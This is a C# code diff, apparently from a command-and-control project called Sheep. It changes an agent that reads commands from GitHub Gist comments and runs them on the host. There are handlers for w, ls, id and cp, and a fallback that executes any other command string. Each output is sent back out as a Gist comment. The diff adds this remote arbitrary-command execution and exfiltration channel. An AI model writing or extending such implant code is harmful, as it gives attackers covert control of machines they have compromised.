@@ -1,4 +1,5 @@
 ﻿using Octokit;
+using Pasture;
 
 namespace Sheep.Core;
 
@@ -74,24 +75,47 @@ public class SheepController
 
         foreach (var comment in comments)
         {
-            if (!_processedComments.TryGetValue(comment.Id, out var found))
+            if (CommandMessage.TryParse(comment.Body, out var commandMessage) && !commandMessage.Answered)
             {
-                _processedComments.Add(comment.Id, comment);
-                await ProcessMessage(comment);
+                await ProcessMessage(commandMessage, comment.Id);
             }
         }
     }
 
-    private async Task ProcessMessage(GistComment comment)
+    private async Task ProcessMessage(CommandMessage commandMessage, int commentId)
     {
-        Console.WriteLine($"Received comment: {comment.Body}");
-        var message = comment.Body;
-
-        if (message.Contains("ls "))
+        if (commandMessage.Command.Contains("w "))
         {
-            Console.WriteLine("Executing ls");
-            var response = await CommandExecutor.ExecuteCommandLs(message.Split("ls ")[0]);
-            await _client.Gist.Comment.Create(_gistId, response);
+            var response = await CommandExecutor.ExecuteCommandW();
+            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
+            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
         }
+        else if (commandMessage.Command.Contains("ls "))
+        {
+            var response = await CommandExecutor.ExecuteCommandLs(commandMessage.Command);
+            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
+            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+        }
+        else if (commandMessage.Command.Contains("id "))
+        {
+            var response = await CommandExecutor.ExecuteCommandW();
+            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
+            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+        }
+        else if (commandMessage.Command.Contains("cp "))
+        {
+            var response = await CommandExecutor.ExecuteCommandCopy();
+            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
+            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+        }
+        else
+        {
+            var response = await CommandExecutor.ExecuteCommand(commandMessage.Command);
+            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
+            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+        }
+
+        commandMessage.Answered = true;
+        await _client.Gist.Comment.Update(_gistId, commentId, commandMessage.GetTransportFormat());
     }
 }
